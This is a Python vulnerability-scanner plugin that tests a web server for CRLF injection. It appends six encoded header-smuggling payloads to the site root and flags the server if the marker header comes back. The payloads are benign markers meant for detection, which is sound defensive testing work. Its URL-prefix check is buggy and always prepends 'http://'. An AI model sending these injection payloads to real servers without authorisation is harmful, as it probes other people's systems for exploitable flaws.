#!/usr/bin/env python
# coding=utf-8

import urlparse
import requests
import urllib


def verify(ip, port=80, name='', timeout=10, types='ip'):
    '''
    payload from awvs decode script: Bash_RCE_Server_Audit.script
    '''
    variants = [
            '%0d%0aheadername: headervalue',
            '%0d%0a%09headername: headervalue',
            "%0d%0a headername: headervalue",
            '%0dheadername: headervalue',
            '%0aheadername: headervalue',
            '%E5%98%8A%E5%98%8Dheadername:%20headervalue'
                ];

    if types == 'ip':
        url = "{}:{}".format(ip, port)
    else:
        url = ip

    if not url.startswith("http:") or not url.startswith("https:"):
        url = 'http://' + url
    
    parsed_url = urlparse.urlparse(url)
    base_url = parsed_url.scheme + "://" + parsed_url.netloc
    path = '/'
    aimed_url = base_url + path

    info = {
        'url': '',
        'severity': 'medium',
        'vuln_name': 'CRLF injection',
        'proof': ''
    }
    for var in variants:
        if testInjection(aimed_url, var):
            info['url'] = aimed_url
            info['proof'] = var 
            return info

    return False
    


def testInjection(url, payload):
    # payload = urllib.urlencode(payload)
    headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
                'Connection': 'close'}
    try:
        resp = requests.get(url + payload, headers=headers, verify=False, allow_redirects=False)
        if 'headername' in resp.headers and resp.headers['headername'].strip() == 'headervalue':
            return True
        else:
            return False
    except Exception as e:
        pass

    return False
